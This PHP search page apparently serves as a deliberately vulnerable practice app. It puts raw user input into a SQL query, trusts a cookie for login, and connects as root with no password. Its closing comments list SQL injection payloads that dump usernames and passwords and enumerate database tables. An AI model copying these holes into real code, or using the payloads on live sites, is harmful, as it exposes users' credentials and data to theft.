<html>
<head>
<title>index</title>
<style>
<?php include 'style.css'; ?>
</style>
</head>
<body bgcolor="lightgrey">

<?php
    session_start();
    //when user is logged in with session
    if (isset($_SESSION['username'])) {
        echo $_SESSION['username']  . " Session <a href='logout.php'>logout</a>";
    }else if(isset($_COOKIE['username'])){ //when user is logged with cookies
        echo $_COOKIE['username']  . " cookie <a href='logout.php'>logout</a>";
    }else{ //when user is not loggedin
        header("Location: login.php");
        exit();
    }

        //connect to db
        $con = @mysqli_connect('localhost','root','', 'test') or die('Failed.');
    ?>
	
	<!-- <div>Text box, takes user input for a search</div>-->
<div class="center">
    <form action="index.php" method="post">
        <p>Search: <input type="text" name="lookup" placeholder="Whatchu tryna find?"></p>
        <br>
        <p class="button"><input type="submit" name="search" value="search" size="100"></p>
    </form>
 </div>
 
 <div>
 <?php
 //Check if there is input, then put it in a variable called $search
 if(isset($_POST['lookup'])){
            $search = $_POST['lookup'];
            if(empty($search)){
                echo "Fill in all the fields";
                exit();
            }
		}

//If a search has been entered, run a query against the stock table with it
if ( isset($search) )
{
	//Query statement, held by $query
	$query = mysqli_query($con, "SELECT * FROM `stock` WHERE `Name` LIKE '%$search%'");
	
	if ( !$query )
	{
		echo mysqli_error($con);
		exit;
	}

	//Take results from $query, output them
	while ( $list = mysqli_fetch_assoc($query) )
	{
		echo 'Item: ' . $list['Name'] . '<br>';
		echo 'Price: $' . $list['Price'] . '<br>';
		echo 'Stock: ' . $list['Quantity'] . '<br>';
	}
}



    //$query = mysql_query("SELECT * FROM `stock` WHERE `Name` LIKE '%hammer' OR '%' = '%'");
	//https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
	//http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
	//' OR 1=1 #
	//hammer' OR SLEEP(1) #
	//' union select username, 0, 0 from user#
	//' union select username, password, 0 from user #
	//' union SELECT 0, table_schema,table_name FROM information_schema.tables #
	//' union SELECT 0, table_schema,table_name FROM information_schema.tables WHERE table_schema = 'test' #
	//' union SELECT 0, table_schema,table_name FROM information_schema.tables WHERE table_schema = 'mysql' #
	
 ?>
 </div>

 </body>
 </html>